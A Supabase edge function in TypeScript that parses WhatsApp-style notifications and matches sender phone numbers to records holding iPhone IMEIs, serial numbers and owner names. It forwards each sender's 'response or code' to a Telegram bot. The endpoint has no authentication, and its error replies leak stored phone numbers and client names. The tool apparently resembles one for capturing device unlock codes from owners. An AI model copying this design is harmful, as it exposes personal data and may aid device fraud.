
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  NotificationTitle?: string;
  NotificationMessage?: string;
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  console.log(`[${new Date().toISOString()}] Received ${req.method} request to telegram-notification`);
  
  if (req.method === 'OPTIONS') {
    console.log('Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Processing notification request...');
    
    let requestData: NotificationData;
    
    try {
      const body = await req.text();
      console.log('Raw request body:', body);
      console.log('Content-Type header:', req.headers.get('content-type'));
      
      if (!body || body.trim() === '') {
        console.log('Empty request body, using default test data');
        requestData = {
          NotificationTitle: '+505 8889 7925',
          NotificationMessage: 'Este es un mensaje de prueba'
        };
      } else {
        // Try to parse as JSON first
        try {
          requestData = JSON.parse(body);
          console.log('Successfully parsed as JSON:', requestData);
        } catch (jsonError) {
          console.log('Failed to parse as JSON, trying text format...');
          
          // Check if it's the IFTTT format with variables that weren't replaced
          if (body.includes('{{NotificationTitle}}') || body.includes('{{NotificationMessage}}')) {
            console.log('Detected IFTTT template variables that weren\'t replaced');
            return new Response(
              JSON.stringify({ 
                success: false, 
                error: 'IFTTT template error',
                message: 'Las variables de IFTTT no se reemplazaron correctamente. Verifica tu configuración de IFTTT.',
                received_body: body
              }), 
              { 
                headers: { ...corsHeaders, 'Content-Type': 'application/json' },
                status: 400
              }
            );
          }
          
          // Try to parse as text format (phone\nmessage)
          const lines = body.split('\n').map(line => line.trim()).filter(line => line.length > 0);
          console.log('Parsed lines from text:', lines);
          
          if (lines.length >= 2) {
            requestData = {
              NotificationTitle: lines[0],
              NotificationMessage: lines[1]
            };
            console.log('Parsed as text format:', requestData);
          } else if (lines.length === 1) {
            // Single line, try to extract phone number from the content
            const singleLine = lines[0];
            
            // Try to find phone number pattern in the message
            const phonePattern = /(\+?\d{1,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4})/;
            const phoneMatch = singleLine.match(phonePattern);
            
            if (phoneMatch) {
              const extractedPhone = phoneMatch[1];
              const messageWithoutPhone = singleLine.replace(phoneMatch[0], '').trim();
              
              requestData = {
                NotificationTitle: extractedPhone,
                NotificationMessage: messageWithoutPhone || 'Mensaje sin contenido'
              };
              console.log('Extracted phone from single line:', requestData);
            } else {
              // No phone found, treat as unknown sender
              requestData = {
                NotificationTitle: 'Número desconocido',
                NotificationMessage: singleLine
              };
              console.log('No phone found, using unknown sender:', requestData);
            }
          } else {
            throw new Error('Unable to parse request body');
          }
        }
      }
    } catch (parseError) {
      console.error('Error parsing request body:', parseError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid request format',
          message: 'Formato de solicitud inválido. Debe ser JSON o texto plano.',
          details: parseError.message
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('Parsed notification data:', requestData);

    let phoneNumber = '';
    let messageText = '';
    
    if (requestData.NotificationTitle || requestData.NotificationMessage) {
      // Try to extract phone number from both title and message
      const titlePhone = extractPhoneFromText(requestData.NotificationTitle || '');
      const messagePhone = extractPhoneFromText(requestData.NotificationMessage || '');
      
      // Use the phone number found in either field
      phoneNumber = titlePhone || messagePhone || requestData.NotificationTitle || '';
      
      // If we found a phone in the message, remove it from the message text
      if (messagePhone && requestData.NotificationMessage) {
        messageText = requestData.NotificationMessage.replace(messagePhone, '').trim();
      } else {
        messageText = requestData.NotificationMessage || '';
      }
    } else if (requestData.message) {
      messageText = requestData.message;
      phoneNumber = requestData.sender || '';
    }

    console.log('Extracted data:', { phoneNumber, messageText });

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    console.log('Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    if (!phoneNumber || phoneNumber === 'Número desconocido') {
      console.log('No valid phone number provided, will try to find any process for testing');
      
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(1);

      if (queryError) {
        console.error('Database query error:', queryError);
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Database error',
            details: queryError.message 
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          }
        );
      }

      if (!processes || processes.length === 0) {
        console.log('No processes with Telegram configured found');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'No processes found',
            message: 'No se encontraron procesos con Telegram configurado'
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 404
          }
        );
      }

      const process = processes[0];
      const profile = process.profiles;

      console.log('Found test process:', process.id, 'for user:', process.user_id);

      const notificationMessage = `🔔 Alerta de proceso de WhatsApp (PRUEBA)

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name || 'Cliente de prueba'}
📱 Modelo: ${process.iphone_model || 'iPhone de prueba'}
📞 IMEI: ${process.imei || 'IMEI de prueba'}
🔢 Serie: ${process.serial_number || 'Serie de prueba'}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber || 'Número de prueba'}
📥 Respuesta o código: ${messageText || 'Mensaje de prueba'}

🤖 Bot Astro en línea 🟢

⚠️ Este es un mensaje de PRUEBA`;

      console.log('Sending test notification to Telegram...');
      
      const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: profile.telegram_chat_id,
          text: notificationMessage,
          parse_mode: 'HTML'
        }),
      });

      const telegramResult = await telegramResponse.json();
      
      if (!telegramResponse.ok) {
        console.error('Telegram API error:', telegramResult);
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Failed to send Telegram message',
            details: telegramResult
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          }
        );
      }

      console.log('Test notification sent successfully to user:', process.user_id);

      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Test notification sent successfully',
          process_id: process.id,
          user_id: process.user_id,
          test_mode: true
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200
        }
      );
    }

    // Clean and normalize phone number for search
    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
    console.log('Searching for process with phone number:', cleanPhoneNumber);

    // First, let's check what phone numbers we have in the database
    console.log('Checking all phone numbers in database...');
    const { data: allProcesses, error: allProcessesError } = await supabase
      .from('processes')
      .select('phone_number, client_name, id, country_code')
      .limit(20);

    if (allProcessesError) {
      console.error('Error fetching all processes:', allProcessesError);
    } else {
      console.log('All phone numbers in database:', allProcesses?.map(p => ({ 
        phone: p.phone_number, 
        client: p.client_name, 
        id: p.id,
        country_code: p.country_code,
        full_number: `${p.country_code}${p.phone_number}`
      })));
    }

    // Enhanced search patterns
    const searchPatterns = [
      cleanPhoneNumber,
      phoneNumber,
      cleanPhoneNumber.startsWith('+') ? cleanPhoneNumber : `+${cleanPhoneNumber}`,
      cleanPhoneNumber.replace('+', ''),
      // For +505 numbers, try without country code
      cleanPhoneNumber.replace(/^\+505/, ''),
      cleanPhoneNumber.replace(/^505/, ''),
      // Try with Nicaragua country code variations
      cleanPhoneNumber.replace(/^\+505/, '+505'),
      cleanPhoneNumber.replace(/^505/, '+505'),
      // Extract just the local number part (last 8 digits for Nicaragua)
      cleanPhoneNumber.slice(-8),
      cleanPhoneNumber.slice(-7),
    ];

    // Remove duplicates and empty patterns
    const uniquePatterns = [...new Set(searchPatterns)].filter(p => p && p.length > 0);
    
    console.log('Trying search patterns:', uniquePatterns);

    let matchedProcess = null;
    let matchedPattern = '';

    for (const pattern of uniquePatterns) {
      console.log(`Searching with pattern: "${pattern}"`);
      
      // Search in phone_number field
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .eq('phone_number', pattern)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null);

      if (queryError) {
        console.error('Database query error for pattern', pattern, ':', queryError);
        continue;
      }

      console.log(`Found ${processes?.length || 0} matching processes for phone_number pattern:`, pattern);

      if (processes && processes.length > 0) {
        matchedProcess = processes[0];
        matchedPattern = pattern;
        console.log('Match found with phone_number pattern:', pattern);
        break;
      }

      // Also try searching by combining country_code + phone_number
      console.log(`Searching for pattern "${pattern}" in combined country_code + phone_number`);
      
      const { data: combinedProcesses, error: combinedError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null);

      if (!combinedError && combinedProcesses) {
        for (const proc of combinedProcesses) {
          const fullNumber = `${proc.country_code}${proc.phone_number}`;
          const fullNumberClean = fullNumber.replace(/[\s\-\(\)]/g, '');
          
          if (fullNumberClean === pattern || 
              fullNumberClean === pattern.replace('+', '') ||
              fullNumber === pattern ||
              proc.phone_number === pattern) {
            matchedProcess = proc;
            matchedPattern = pattern;
            console.log('Match found with combined pattern:', pattern, 'matching:', fullNumber);
            break;
          }
        }
        
        if (matchedProcess) break;
      }
    }

    if (!matchedProcess) {
      console.log('No matching process found for any pattern');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: `No se encontró un proceso con el número de teléfono: ${cleanPhoneNumber}`,
          phone_searched: cleanPhoneNumber,
          patterns_tried: uniquePatterns,
          sample_numbers_in_db: allProcesses?.slice(0, 5).map(p => ({
            phone: p.phone_number,
            country: p.country_code,
            full: `${p.country_code}${p.phone_number}`,
            client: p.client_name
          })),
          debug_info: {
            original_phone: phoneNumber,
            cleaned_phone: cleanPhoneNumber,
            total_processes_in_db: allProcesses?.length || 0,
            request_content_type: req.headers.get('content-type'),
            parsed_data: requestData
          }
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    const process = matchedProcess;
    const profile = process.profiles;

    console.log('Found process:', process.id, 'for user:', process.user_id, 'with pattern:', matchedPattern);

    if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
      console.log('User has not configured Telegram bot');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Telegram not configured',
          message: 'El usuario no ha configurado su bot de Telegram'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    const notificationMessage = `🔔 Alerta de proceso de WhatsApp

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📞 IMEI: ${process.imei}
🔢 Serie: ${process.serial_number}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber}
📥 Respuesta o código: ${messageText}

🤖 Bot Astro en línea 🟢`;

    console.log('Sending notification to Telegram...');
    
    const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: profile.telegram_chat_id,
        text: notificationMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Failed to send Telegram message',
          details: telegramResult
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log('Notification sent successfully to user:', process.user_id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        phone_number: cleanPhoneNumber,
        matched_pattern: matchedPattern,
        message_content: messageText
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (error) {
    console.error('Error processing notification:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});

// Helper function to extract phone number from text
function extractPhoneFromText(text: string): string {
  if (!text) return '';
  
  // Pattern to match phone numbers in various formats
  const patterns = [
    /(\+?\d{1,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4})/g,
    /(\+\d{1,4}\s?\d{8,})/g,
    /(\d{8,})/g
  ];
  
  for (const pattern of patterns) {
    const match = text.match(pattern);
    if (match) {
      return match[0];
    }
  }
  
  return '';
}
